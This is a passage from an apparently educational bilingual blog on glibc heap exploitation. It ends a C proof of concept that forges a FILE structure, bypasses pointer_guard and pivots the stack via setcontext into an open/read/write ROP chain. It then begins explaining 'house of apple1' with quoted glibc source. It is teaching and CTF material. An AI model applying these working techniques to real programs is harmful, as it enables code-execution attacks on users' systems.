[rdx+xx]&#x27;\033[32m.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we can&#x27;t change the value of rsp only by writing forged data in our fake _IO_FILE_plus struct.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们不能仅通过将假的数据写入到假的_IO_FILE_plus结构体而修改rsp的值。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHowever, we still have our way to exploit. It&#x27;s called pcop, which is just a unique gadget.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但我们依然能够进行漏洞利用，需要一个pcop，这是一个特殊的gadget。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTry to use this command below in the terminal: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m可以尝试在终端运行以下命令：: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;34mobjdump -d /lib/x86_64-linux-gnu/libc.so.6 -M intel | grep &#x27;1675b&#x27;\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mYou can see a gadget in offset \033[31m0x1675b0\033[32m: \033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m你可以在偏移\033[31m0x1675b0\033[32m处看到有一个gadget: \033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[34m  1675b0:       48 8b 57 08             mov    rdx,QWORD PTR [rdi+0x8]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;  1675b4:       48 89 04 24             mov    QWORD PTR [rsp],rax\n&quot;</span></span><br><span class="line">             <span class="string">&quot;  1675b8:       ff 52 20                call   QWORD PTR [rdx+0x20]\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt seems that we can use the value of [rdi+0x8] to change rdx to any value as we like.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们似乎可以使用[rdi+0x8]的值去修改rdx的值为任意值。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAnd then we can change the rip into [rdx+0x20].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们就可以将rip修改到[rdx+0x20]。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe can change rdx to a place that we can control, then write setcontext() address in it to trigger stack pivoting.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们可以将rdx修改到一个我们可以控制的地方，然后将setcontext函数的地址写进去来触发栈迁移。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTo keep the environment of heap, we use a space in bss segment to complete this process.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m为了保持堆环境，我们使用bss段的一块空间来完成这个过程。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of bss space is: \033[31m%p\033[32m.\033[0m\n&quot;</span>, &amp;space);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mbss对应地址为: \033[31m%p\033[32m.\033[0m\n\n&quot;</span>, &amp;space);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe let [rdi+0xe0] = bss address, [rdi+0xe8] = pcop address.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们让[rdi+0xe0] = bss的地址, [rdi+0xe8] = pcop的地址.\033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span>* bss_address = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of bss should be written in: \033[31m%p\n\033[0m&quot;</span>, bss_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个bss的地址应该被写入: \033[31m%p\n\033[0m&quot;</span>, bss_address);</span><br><span class="line">        *bss_address = (<span class="type">size_t</span>)(&amp;space);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *bss_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个指针的值现在为: \033[31m%#zx\033[0m\n&quot;</span>, *bss_address);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span>* pcop = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of pcop should be written in: \033[31m%p\n\033[0m&quot;</span>, pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mpcop的地址应该被写入到: \033[31m%p\n\033[0m&quot;</span>, pcop);</span><br><span class="line">        *pcop = (<span class="type">size_t</span>)(libc_base + <span class="number">0x1675b0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个指针现在的值为: \033[31m%#zx\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mDon&#x27;t forget we need to encrypt the pcop value.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m别忘了我们需要加密pcop的值。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThen we need to let it xor with pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后我们需要让pcop与pointer_guard异或: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        *pcop ^= *pointer_guard_address;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter xor, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m异或之后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m&quot;</span>, *pcop);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to let it rol 0x11 bits.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们让它循环左移0x11位。\033[0m&quot;</span>);</span><br><span class="line">        *pcop = (*pcop &lt;&lt; <span class="number">0x11</span>) + (*pcop &gt;&gt; <span class="number">0x2f</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter rol, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m循环左移之后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m\n&quot;</span>, *pcop);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow, we are ready to write something in our bss segment.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m现在我们准备写一些内容到bss段。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNoticing that the first instruction of pcop moves [rdi+0x8] to rdx, while rdi now is address of bss.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意到pcop的第一条指令将[rdi+0x8]的值移动到rdx，而rdi此时的值是bss处的地址。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSo that we can write the address of somewhere in bss to [rdi+0x8](%p).\033[0m&quot;</span>, &amp;(space[<span class="number">1</span>]));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m所以我们可以将任意地址写到[rdi+0x8](%p)这个bss段中的地址。.\033[0m&quot;</span>, &amp;(space[<span class="number">1</span>]));</span><br><span class="line">        space[<span class="number">1</span>] = (<span class="type">size_t</span>)space;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m[rdi+0x8] now is: \033[31m%#zx\033[32m.\n\033[0m&quot;</span>, space[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m[rdi+0x8]现在的值为: \033[31m%#zx\033[32m.\n\033[0m&quot;</span>, space[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to write address of setcontext into [rdx+0x20].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们需要写setcontext函数的地址到[rdx+0x20]。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHave a look at disassembly result of function setcontext: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m看一下setcontext函数的汇编: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[34m.text:0000000000053A6D                 \033[1;31mmov     rsp, [rdx+0A0h]\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A74                 mov     rbx, [rdx+80h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A7B                 mov     rbp, [rdx+78h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A7F                 mov     r12, [rdx+48h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A83                 mov     r13, [rdx+50h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A87                 mov     r14, [rdx+58h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A8B                 mov     r15, [rdx+60h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A8F                 test    dword ptr fs:48h, 2\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A9B                 jz      loc_53B56\n&quot;</span></span><br><span class="line">             <span class="string">&quot;\t\t\t......\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B56                 \033[1;31mmov     rcx, [rdx+0A8h]\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B5D                 \033[1;31mpush    rcx\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B5E                 mov     rsi, [rdx+70h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B62                 mov     rdi, [rdx+68h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B66                 mov     rcx, [rdx+98h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B6D                 mov     r8, [rdx+28h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B71                 mov     r9, [rdx+30h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B75                 mov     rdx, [rdx+88h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B75 ; &#125; // starts at 53A30\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7C ; __unwind &#123;\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7C                 xor     eax, eax\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7E                 retn\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe let [rdx+0xa0] = bss + 0x100, and let [rdx+0xa8] = some gadget address as the start of our ROP chain.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们让[rdx+0xa0] = bss + 0x100, 让[rdx+0xa8] = 某些gadget的地址作为ROP链的开始。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThere are some useful gadgets: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里是一些有用的gadget地址: \033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span> poprdi_ret = libc_base + <span class="number">0x2a3e5</span>;</span><br><span class="line">        <span class="type">size_t</span> poprsi_ret = libc_base + <span class="number">0x2be51</span>;</span><br><span class="line">        <span class="type">size_t</span> poprdx_rbx_ret = libc_base + <span class="number">0x90529</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rdi ; ret : %#zx\n\033[0m&quot;</span>, poprdi_ret);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rsi ; ret : %#zx\n\033[0m&quot;</span>, poprsi_ret);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rdx ; pop rbx ; ret : %#zx\n\033[0m&quot;</span>, poprdx_rbx_ret);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere are some key functions: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里是一些关键函数的地址: \033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span> readfunc_addr = (<span class="type">size_t</span>)read;</span><br><span class="line">        <span class="type">size_t</span> writefunc_addr = (<span class="type">size_t</span>)write;</span><br><span class="line">        <span class="type">size_t</span> openfunc_addr = (<span class="type">size_t</span>)open;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mopen(): %#zx\n\033[0m&quot;</span>, openfunc_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mread(): %#zx\n\033[0m&quot;</span>, readfunc_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mwrite(): %#zx\n\033[0m&quot;</span>, writefunc_addr);</span><br><span class="line"></span><br><span class="line">        space[<span class="number">0x20</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(libc_base + <span class="number">0x53a6d</span>);</span><br><span class="line">        space[<span class="number">0xa0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0x100</span> / <span class="number">8</span>]);</span><br><span class="line">        space[<span class="number">0xa8</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen let&#x27;s construct our ROP chain.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们来构造ROP链。\033[0m&quot;</span>);</span><br><span class="line">        space[<span class="number">0x100</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)flag;</span><br><span class="line">        space[<span class="number">0x108</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x110</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x118</span> / <span class="number">8</span>] = openfunc_addr;</span><br><span class="line">        space[<span class="number">0x120</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line">        space[<span class="number">0x128</span> / <span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">        space[<span class="number">0x130</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x138</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0xf0</span>]);</span><br><span class="line">        space[<span class="number">0x140</span> / <span class="number">8</span>] = poprdx_rbx_ret;</span><br><span class="line">        space[<span class="number">0x148</span> / <span class="number">8</span>] = <span class="number">0x40</span>;</span><br><span class="line">        space[<span class="number">0x150</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x158</span> / <span class="number">8</span>] = readfunc_addr;</span><br><span class="line">        space[<span class="number">0x160</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line">        space[<span class="number">0x168</span> / <span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">        space[<span class="number">0x170</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x178</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0xf0</span>]);</span><br><span class="line">        space[<span class="number">0x180</span> / <span class="number">8</span>] = poprdx_rbx_ret;</span><br><span class="line">        space[<span class="number">0x188</span> / <span class="number">8</span>] = <span class="number">0x40</span>;</span><br><span class="line">        space[<span class="number">0x190</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x198</span> / <span class="number">8</span>] = writefunc_addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere is the former part of bss spare space:\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m下面是bss空闲区域前面的一部分:\033[0m&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x20</span>; i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34m+%#5x\t\t%#18zx\t\t%#18zx\n\033[0m&quot;</span>, i * <span class="number">0x10</span>, space[<span class="number">2</span>*i], space[<span class="number">2</span>*i+<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31mError: invalid exploit mode!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m错误：选择了无效的利用模式！\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[032mThen, we need to \033[31mchange the size of top chunk to make it unaligned, and malloc a big space.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[032m然后，我们需要\033[31m修改top chunk的大小来让它不对齐，然后malloc一块大空间。\033[0m&quot;</span>);</span><br><span class="line">    *top_chunk_size = <span class="number">0x101</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of top_chunk-&gt;size was changed into: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m现在top_chunk-&gt;size的值被修改为: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen, change the value of stderr pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后，修改stderr指针的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: *stderr_pointer = \033[33m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改之前: *stderr_pointer = \033[33m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    *(<span class="type">size_t</span>*)stderr_ptr = (<span class="type">size_t</span>)fake_file_struct;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: *stderr_pointer = \033[31m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改之后: *stderr_pointer = \033[31m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAnd the last step: malloc(0x200) to trigger sysmalloc.\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后是最后一步：malloc(0x200)触发sysmalloc。\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a><a class="link"   href="https://bbs.kanxue.com/thread-273418.htm" >house of apple1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p><strong>前置条件</strong></p>
<ul>
<li><code>glibc &gt;= 2.23</code>。</li>
<li>程序从 <code>main</code> 函数返回或能调用 <code>exit</code> 函数。</li>
<li>能泄露出 <code>heap</code> 地址和 <code>libc</code> 地址。</li>
<li>能使用一次 <code>largebin attack</code>。</li>
</ul>
<h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p>当程序从<code>main</code>函数返回或者执行<code>exit</code>函数的时候，均会调用<code>fcloseall</code>函数。</p>
<p>该调用链为：<code>exit -&gt; fcloseall-&gt;_IO_cleanup -&gt;_IO_flush_all_lockp -&gt;_IO_OVERFLOW</code>。</p>
<p>最后会遍历<code>_IO_list_all</code>存放的每一个<code>IO_FILE</code>结构体，如果满足 <code>FSOP</code> 条件的话，会调用每个结构体中<code>vtable-&gt;_overflow</code>函数指针指向的函数。使用 <code>largebin attack</code> 可以劫持 <code>_IO_list_all</code> 变量，将其替换为伪造的<code>IO_FILE</code>结构体。</p>
<p><code>apple1</code> 主要利用了 <code>IO_FILE</code> 中的 <code>_wide_data</code> 指针成员，其指向结构体 <code>_IO_wide_data</code>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>_IO_wstrn_overflow</code> 函数中会在 <code>_wide_data</code> 指向的内存中写入连续 8 个 <code>snf-&gt;overflow_buf</code> 开始或结束位置的值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*绕过点 2 */</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line">  <span class="comment">/*绕过点 1 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">		 snf-&gt;overflow_buf + (<span class="built_in">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">				      / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">				      + (<span class="built_in">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">					 / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>_IO_wstrnfile</code>定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_strfile_</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span> _sbf;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span> _s;</span><br><span class="line">&#125; _IO_strfile;</span><br><span 